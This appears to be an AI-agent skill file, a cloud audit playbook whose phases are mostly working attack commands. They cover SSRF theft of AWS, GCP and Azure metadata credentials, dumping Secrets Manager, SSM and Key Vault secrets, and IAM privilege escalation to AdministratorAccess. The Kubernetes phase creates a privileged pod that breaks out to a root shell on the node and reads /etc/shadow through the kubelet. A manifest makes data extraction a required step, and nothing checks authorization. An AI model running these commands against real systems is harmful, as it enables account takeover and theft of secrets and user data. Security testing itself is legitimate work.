---
name: cloud-audit
description: Use when auditing cloud infrastructure for misconfigurations, testing AWS IAM privilege escalation, enumerating exposed S3 buckets, attacking GCP service accounts, testing Azure RBAC misconfigs, hunting for exposed Kubernetes API servers, or finding cloud credential leaks in metadata services. Also use when the user says "cloud audit", "AWS pentest", "GCP attack", "K8s attack", "S3 exposed", "metadata service", or "cloud misconfiguration".
---

# Cloud Infrastructure Audit Playbook

## Philosophy
Cloud misconfigs are the highest-signal, lowest-effort findings in modern pentests.
One SSRF to 169.254.169.254 = IAM creds = all S3 = all Secrets Manager = game over.
Never claim "cloud compromise" without demonstrating actual data access with real credentials.

## Arguments
`<target>` - domain or AWS account ID
`<focus>` - optional: AWS / GCP / AZURE / K8S / FULL

---

## Phase 0: Smart Intake

```bash
source ~/.claude/skills/_shared/phase0.sh
source ~/.claude/skills/_shared/signals.sh

p0_init_vars "$1"
p0_state_gate "HARVEST" || exit 0
p0_read_relay recon secrets exploit
p0_read_memory
p0_read_hypotheses

AWS_KEYS=$AWS_KEYS_FOUND  # alias to match downstream references

echo "=== PHASE 0 CLOUD-AUDIT INTAKE: $TARGET ==="
echo "State: $STATE"
echo "AWS keys found: $AWS_KEYS | SSRF vectors: $(echo "$SSRF_VECTORS" | wc -l)"
echo "AWS/GCP/Azure hints: $AWS_HINT/$GCP_HINT/$AZURE_HINT"
echo "ATW flagged (avoid): ${ATW_FLAGGED:-none}"
```

### Execution Manifest

```bash
# Manifest is dynamic: only include phases for confirmed cloud providers
# MUST items = confirmed via prior intel. SHOULD = hinted. IF_TIME = speculative.

MANIFEST=$(cat << 'MANIFEST_EOF'
{
  "phase": "cloud-audit",
  "generated_at": "YYYY-MM-DD HH:MM",
  "items": [
    {"id":"c01","tool":"cloud-footprint-discovery","target":"<target>","reason":"identify cloud provider from DNS/headers","priority":"MUST","status":"pending","skip_reason":null},
    {"id":"c02","tool":"s3-bucket-enum","target":"<target-brand>","reason":"find exposed S3/GCS/Azure blob buckets","priority":"MUST","status":"pending","skip_reason":null},
    {"id":"c03","tool":"imds-ssrf","target":"<ssrf-endpoint-from-exploit-relay>","reason":"SSRF->IMDS credential theft if SSRF_VECTORS found","priority":"MUST","status":"pending","skip_reason":"set to skipped if no SSRF_VECTORS"},
    {"id":"c04","tool":"aws-iam-enum","target":"credentials from SSRF or secrets","reason":"enumerate IAM permissions, privesc paths","priority":"MUST","status":"pending","skip_reason":"set to skipped if no AWS credentials"},
    {"id":"c05","tool":"aws-data-exfil","target":"S3/SecretsManager/SSM/Lambda","reason":"extract actual sensitive data to prove impact","priority":"MUST","status":"pending","skip_reason":null},
    {"id":"c06","tool":"gcp-metadata-enum","target":"<ssrf-endpoint>","reason":"GCP SA token via metadata if GCP_HINT=true","priority":"SHOULD","status":"pending","skip_reason":"skip if GCP_HINT=false"},
    {"id":"c07","tool":"azure-imds","target":"<ssrf-endpoint>","reason":"Azure managed identity token if AZURE_HINT=true","priority":"SHOULD","status":"pending","skip_reason":"skip if AZURE_HINT=false"},
    {"id":"c08","tool":"k8s-api-probe","target":"<live-hosts>:6443","reason":"exposed K8s API server","priority":"IF_TIME","status":"pending","skip_reason":null},
    {"id":"c09","tool":"cloud-misconfiguration-checklist","target":"<account>","reason":"IAM wildcard, SGgroups, CloudTrail disabled","priority":"SHOULD","status":"pending","skip_reason":null}
  ]
}
MANIFEST_EOF
)

jq --argjson m "$MANIFEST" '.scalpel.active_manifest = $m' $SESSION > /tmp/s.json && mv /tmp/s.json $SESSION
```

**Manifest adjustment rules:**
- If `AWS_KEYS=false` AND `SSRF_VECTORS` empty: mark c03, c04 as `skipped` ("no SSRF or keys to work with")
- If `GCP_HINT=false`: mark c06 as `skipped`
- If `AZURE_HINT=false`: mark c07 as `skipped`
- If `STATE=DEEP`: mark c08 as `skipped`

---

## Phase 1 - Pre-Engagement: Discover Cloud Footprint

```bash
# Identify cloud provider from infrastructure:
dig <target> +short | head -5
# *.amazonaws.com, *.cloudfront.net = AWS
# *.googleusercontent.com, *.appspot.com = GCP
# *.azurewebsites.net, *.blob.core.windows.net = Azure

# Check HTTP response headers:
curl -sI https://<target> | grep -i "server\|via\|x-amz\|x-goog\|x-ms-"

# S3 bucket discovery (from any prior recon intel):
cat ~/pentest-toolkit/results/<target>/interesting_recon.md 2>/dev/null | grep -i "s3\|bucket\|storage\|blob"

# Enumerate S3 buckets by brand name:
BRAND="<target-brand>"
for name in ${BRAND} ${BRAND}-prod ${BRAND}-dev ${BRAND}-static ${BRAND}-media \
            ${BRAND}-backup ${BRAND}-logs ${BRAND}-assets ${BRAND}-data ${BRAND}-uploads \
            ${BRAND}-internal ${BRAND}-staging ${BRAND}-cdn ${BRAND}-files; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://${name}.s3.amazonaws.com/")
  [[ "$status" != "404" ]] && echo "FOUND: ${name} -> HTTP $status"
done

# GCS bucket enumeration:
for name in ${BRAND} ${BRAND}-prod ${BRAND}-static ${BRAND}-cdn ${BRAND}-backup; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://storage.googleapis.com/${name}/")
  [[ "$status" != "404" ]] && echo "FOUND GCS: ${name} -> HTTP $status"
done

# Azure Blob Storage:
for name in ${BRAND} ${BRAND}prod ${BRAND}static ${BRAND}backup; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://${name}.blob.core.windows.net/${name}/")
  [[ "$status" != "404" ]] && echo "FOUND Azure: ${name} -> HTTP $status"
done
```

---

## Phase 2 - AWS: Metadata Service Exploitation (via SSRF)

**If you found SSRF in the app, this is the highest-value escalation:**

```bash
# AWS EC2 metadata (IMDSv1 - no auth required):
SSRF_ENDPOINT="https://<target>/fetch?url="

# Step 1: Confirm SSRF + metadata access
curl "${SSRF_ENDPOINT}http://169.254.169.254/latest/meta-data/"
# If response contains: ami-id, instance-id, local-ipv4 = IMDSv1 accessible

# Step 2: Get IAM role name
curl "${SSRF_ENDPOINT}http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Response: rolename (e.g., "ec2-prod-role")

# Step 3: Get credentials
curl "${SSRF_ENDPOINT}http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE-NAME>"
# Response contains: AccessKeyId, SecretAccessKey, Token, Expiration

# IMDSv2 (requires token header - but SSRF often can set headers too):
TOKEN=$(curl -s -X PUT "${SSRF_ENDPOINT}http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl "${SSRF_ENDPOINT}http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  -H "X-aws-ec2-metadata-token: ${TOKEN}"

# ECS metadata (containers on ECS/Fargate):
curl "${SSRF_ENDPOINT}http://169.254.170.2/v2/credentials/<uuid-from-env>"
# Container metadata:
curl "${SSRF_ENDPOINT}http://169.254.170.2/v2/metadata"
```

---

## Phase 3 - AWS: Credential Enumeration & Privilege Escalation

```bash
# Use credentials from SSRF or leaked keys:
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."  # if temporary

# Step 1: Identify who you are
aws sts get-caller-identity
# Returns: Account ID, UserId, ARN -> understand your starting permissions

# Step 2: Enumerate attached policies
aws iam get-user 2>/dev/null
aws iam list-attached-user-policies --user-name <username> 2>/dev/null
aws iam list-user-policies --user-name <username> 2>/dev/null
aws iam list-groups-for-user --user-name <username> 2>/dev/null

# For role (from EC2 SSRF):
aws iam list-attached-role-policies --role-name <role-name>
aws iam list-role-policies --role-name <role-name>
aws iam get-role-policy --role-name <role-name> --policy-name <policy-name>

# Step 3: Enumerate accessible services (automated):
# Tool: enumerate-iam (https://github.com/andresriancho/enumerate-iam)
python3 enumerate-iam.py --access-key $AWS_ACCESS_KEY_ID --secret-key $AWS_SECRET_ACCESS_KEY

# Step 4: High-value data enumeration
# S3 - list all buckets + their contents
aws s3 ls
aws s3 ls s3://<bucket-name>/ --recursive | head -50
aws s3 cp s3://<bucket-name>/database.sql . 2>/dev/null  # if sensitive file found

# Secrets Manager - ALL application secrets
aws secretsmanager list-secrets --region us-east-1
aws secretsmanager get-secret-value --secret-id <secret-arn>

# SSM Parameter Store - often contains DB passwords, API keys
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption 2>/dev/null

# EC2 user-data (often contains startup scripts with hardcoded credentials):
aws ec2 describe-instance-attribute --instance-id <id> --attribute userData \
  | python3 -c "import sys,json,base64; d=json.load(sys.stdin); print(base64.b64decode(d['UserData']['Value']).decode())"

# Lambda functions (source code + env vars):
aws lambda list-functions
aws lambda get-function --function-name <name>  # includes download URL
aws lambda get-function-configuration --function-name <name> | python3 -m json.tool | grep -i "env\|key\|secret\|pass"

# RDS instances (find internal DB endpoints):
aws rds describe-db-instances | python3 -m json.tool | grep -i "endpoint\|port\|master"

# CloudFormation stacks (template = infrastructure + often plaintext secrets):
aws cloudformation list-stacks
aws cloudformation get-template --stack-name <name>
```

---

## Phase 4 - AWS IAM Privilege Escalation Paths

```bash
# Check for these PrivEsc paths (one is enough for full admin):

# 1. iam:CreatePolicyVersion -> update any policy to AdministratorAccess
aws iam create-policy-version --policy-arn arn:aws:iam::<ACCOUNT>:policy/<policy> \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# 2. iam:AttachUserPolicy -> attach AdministratorAccess to yourself
aws iam attach-user-policy --user-name <your-user> \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 3. iam:PassRole + lambda:CreateFunction -> create Lambda with admin role, invoke for RCE
aws lambda create-function --function-name priv-esc \
  --runtime python3.9 --role arn:aws:iam::<ACCOUNT>:role/admin-role \
  --handler index.handler --zip-file fileb://exploit.zip
aws lambda invoke --function-name priv-esc output.txt

# 4. sts:AssumeRole -> enumerate assumable roles
aws iam list-roles | python3 -m json.tool | grep RoleName
# Try assuming each role:
aws sts assume-role --role-arn arn:aws:iam::<ACCOUNT>:role/<role> --role-session-name test

# 5. ec2:RunInstances + iam:PassRole -> launch instance with admin role
# Instance user-data runs with passed role permissions

# Automated privesc checker:
# Tool: Pacu (AWS exploitation framework)
# pip install pacu
# pacu -> import_keys -> run iam__privesc_scan
```

---

## Phase 5 - GCP: Service Account & Metadata Exploitation

```bash
# GCP Compute Engine metadata (via SSRF or direct):
SSRF="https://<target>/fetch?url="

# Instance metadata (no auth needed for older configs):
curl "${SSRF}http://metadata.google.internal/computeMetadata/v1/instance/" \
  -H "Metadata-Flavor: Google"

# Service account credentials:
curl "${SSRF}http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"
# Response: {"access_token": "ya29...", "token_type": "Bearer", "expires_in": 3599}

# Use GCP access token:
export GCP_TOKEN="ya29..."
curl -H "Authorization: Bearer $GCP_TOKEN" \
  "https://storage.googleapis.com/storage/v1/b?project=<project-id>"

# List GCS buckets:
curl -H "Authorization: Bearer $GCP_TOKEN" \
  "https://www.googleapis.com/storage/v1/b?project=<project-id>"

# Read GCS bucket contents:
curl -H "Authorization: Bearer $GCP_TOKEN" \
  "https://storage.googleapis.com/storage/v1/b/<bucket>/o"

# Service account key files (if exposed in git/config):
gcloud auth activate-service-account --key-file=service-account.json
gcloud projects list
gcloud iam service-accounts list --project=<project>
gcloud projects get-iam-policy <project>

# GCP PrivEsc:
# iam.serviceAccountTokenCreator on admin SA = impersonate admin SA
gcloud iam service-accounts generate-access-token admin@<project>.iam.gserviceaccount.com
```

---

## Phase 6 - Azure: RBAC & Storage Exploitation

```bash
# Azure IMDS (Instance Metadata Service):
curl "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  -H "Metadata: true" | python3 -m json.tool

# Azure Managed Identity token:
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  -H "Metadata: true"
# Returns: access_token for Azure Resource Manager

# Use Azure ARM token:
TOKEN="eyJ0..."
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"

# Azure Blob Storage public access (no auth):
# Blob URL pattern: https://<account>.blob.core.windows.net/<container>/<blob>
curl "https://<account>.blob.core.windows.net/<container>?restype=container&comp=list"
# If 200 with XML = public container = list all blobs

# Storage Account keys (if you have ARM access):
az storage account keys list --account-name <account> --resource-group <rg>
# With key: full access to ALL blobs in account

# Azure Key Vault (most sensitive - all secrets):
curl -H "Authorization: Bearer $TOKEN" \
  "https://<vault>.vault.azure.net/secrets?api-version=7.3"
# If accessible = all application secrets exposed

# RBAC misconfiguration check:
az role assignment list --all --query "[?principalType=='ServicePrincipal']"
# Look for: Owner/Contributor assigned to external/guest accounts
```

---

## Phase 7 - Kubernetes: API Server & RBAC Exploitation

```bash
# Find exposed K8s API servers:
nmap -p 6443,8443,8080,10250 <target-range>
curl -sk https://<target>:6443/api/v1/

# Unauthenticated access (misconfigured anonymous auth):
kubectl --server=https://<k8s-ip>:6443 --insecure-skip-tls-verify get pods --all-namespaces
kubectl --server=https://<k8s-ip>:6443 --insecure-skip-tls-verify get secrets --all-namespaces

# From inside a pod (check if service account token has broad permissions):
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://kubernetes.default.svc"
CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

curl --cacert $CA -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/
curl --cacert $CA -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/secrets
# If secrets accessible = ALL K8s secrets = all app credentials

# K8s privilege escalation - common misconfigured ClusterRoleBindings:
kubectl auth can-i create pods --all-namespaces
kubectl auth can-i get secrets --all-namespaces
kubectl auth can-i list nodes

# Pod breakout to host (if privileged pod or hostPID):
# Create privileged pod if you have pod creation rights:
cat << EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: priv-escape
spec:
  hostPID: true
  containers:
  - name: shell
    image: alpine
    securityContext:
      privileged: true
    command: ["/bin/sh", "-c", "nsenter -t 1 -m -u -i -n /bin/sh"]
    volumeMounts:
    - mountPath: /host
      name: host-vol
  volumes:
  - name: host-vol
    hostPath:
      path: /
EOF
kubectl exec -it priv-escape -- nsenter -t 1 -m -u -i -n /bin/sh
# = root shell on K8s node host

# etcd access (all K8s secrets unencrypted at rest):
curl http://<etcd-ip>:2379/v2/keys/?recursive=true | python3 -m json.tool | grep -i "secret\|token\|password"

# Kubelet API (default: port 10250, often unauthenticated):
curl -sk https://<node-ip>:10250/pods | python3 -m json.tool
curl -sk https://<node-ip>:10250/run/<namespace>/<pod-name>/<container> \
  -d "cmd=cat /etc/shadow"

# K8s dashboard (often deployed without auth):
curl http://<target>:8001/api/v1/namespaces/kube-system/services/kubernetes-dashboard/proxy/
```

---

## Phase 8 - Cloud Misconfiguration Checklist

```bash
# Run this checklist for every cloud engagement:

echo "=== S3 / GCS / Azure Blob ==="
# Public read: curl bucket URL -> does it list files?
# Public write: curl -X PUT bucket URL with test file -> does it succeed?
# Versioning disabled (if backup bucket): old versions may contain secrets

echo "=== IAM / RBAC ==="
# Wildcard actions: iam policies with Action: "*" or Action: "s3:*"
# Cross-account trust: roles assumable from any AWS account (Principal: "*")
# Unused high-privilege service accounts

echo "=== Metadata Service ==="
# IMDSv1 enabled (no token required) = SSRF -> credential theft
# Container metadata unprotected

echo "=== Secrets Storage ==="
# Hardcoded creds in: Lambda env vars, EC2 user-data, CloudFormation templates
# Secrets in unencrypted SSM parameters (StringList vs SecureString)

echo "=== Network ==="
# Security groups: 0.0.0.0/0 on ports 22, 3389, 6379 (Redis), 5432 (PostgreSQL)
# K8s etcd exposed on 2379
# K8s API on 8080 (insecure port, no auth)

echo "=== Logging / Monitoring ==="
# CloudTrail disabled (all API calls unlogged)
# S3 bucket logging disabled
# GuardDuty not enabled
```

---

## Evidence Requirements

**CRITICAL:**
- AWS credentials extracted from metadata + sts:GetCallerIdentity confirms them
- S3 bucket with sensitive files (DB dump, .env, credentials) publicly readable
- K8s API unauthenticated + get secrets succeeds

**HIGH:**
- S3 bucket publicly listable (reveals file names even if content needs auth)
- Lambda/EC2 env vars contain plaintext credentials
- Managed identity can access Key Vault or Secrets Manager

**MEDIUM:**
- Security group allows 0.0.0.0/0 on admin ports
- IMDSv1 enabled but no SSRF found to exploit it
- Publicly readable bucket with non-sensitive data

---

## Output

Write to `~/pentest-toolkit/results/<target>/interesting_cloud-audit.md`:

```markdown
## Status
critical-exposure | misconfigured | hardened

## Cloud Provider
AWS / GCP / Azure / Multi-cloud

## Summary
<account ID, services accessible, most critical finding>

## Critical Findings
- [CONFIRMED] IMDSv1 + SSRF -> IAM role ec2-prod-role -> S3 full access
  Credentials: AKIA... (rotated after report)
  Evidence: aws sts get-caller-identity -> Account: 123456789
  Data accessed: 3 S3 buckets including prod-db-backups

## Privilege Escalation Path
<what you started with -> what you escalated to>

## Data Accessed
| Resource | Sensitivity | Content |
|----------|-------------|---------|
| s3://prod-db-backups/ | CRITICAL | MySQL dump with 2M user records |
| ssm:/database/password | HIGH | Production DB credentials |

## Remediation Priority
1. Enforce IMDSv2 on all EC2 instances
2. Remove public S3 bucket ACLs
3. Rotate exposed IAM credentials
```

Tell user: "Cloud audit complete. `interesting_cloud-audit.md` written. Key finding: <one-liner>. Run `/triage <target>` to aggregate."

---

## Phase-End Protocol

### Completion Gate

```bash
PENDING_MUST=$(jq '[.scalpel.active_manifest.items[] | select(.priority=="MUST" and .status=="pending")] | length' $SESSION 2>/dev/null || echo 0)
if [ "$PENDING_MUST" -gt 0 ]; then
  echo "=== COMPLETION GATE BLOCKED ==="
  echo "$PENDING_MUST MUST items not completed:"
  jq '.scalpel.active_manifest.items[] | select(.priority=="MUST" and .status=="pending") | "\(.id): \(.tool) on \(.target)"' $SESSION
  echo "Run them now or skip with explicit reason before proceeding."
fi
```

### Intel Relay Write

```bash
# Emit structured handoff for zerodayhunt + report phases
CLOUD_CREDS_JSON=$(jq -r '.intel.credentials[]? | select(.type | test("aws|gcp|azure";"i")) | {type:.type,value:.value}' $SESSION | jq -s . 2>/dev/null || echo "[]")
DATA_ACCESSED=$(jq -r '.report_draft.findings[]? | select(.status=="confirmed") | .title' $SESSION | jq -R . | jq -s . 2>/dev/null || echo "[]")
PRIV_ESC=$(jq -r '.report_draft.findings[]? | select(.vuln_class | test("priv.*esc|iam";"i")) | .title' $SESSION | head -1 | jq -R . 2>/dev/null || echo "null")

jq --argjson creds "$CLOUD_CREDS_JSON" \
   --argjson data "$DATA_ACCESSED" \
   --argjson privesc "$PRIV_ESC" \
   '.intel_relay.from_cloud_audit = {
     "cloud_credentials": $creds,
     "data_accessed": $data,
     "privesc_confirmed": ($privesc != null),
     "privesc_path": $privesc
   } |
   .threads[0].phase = "triage"' \
   $SESSION > /tmp/s.json && mv /tmp/s.json $SESSION

echo "Intel relay written. Run /triage $TARGET."
```
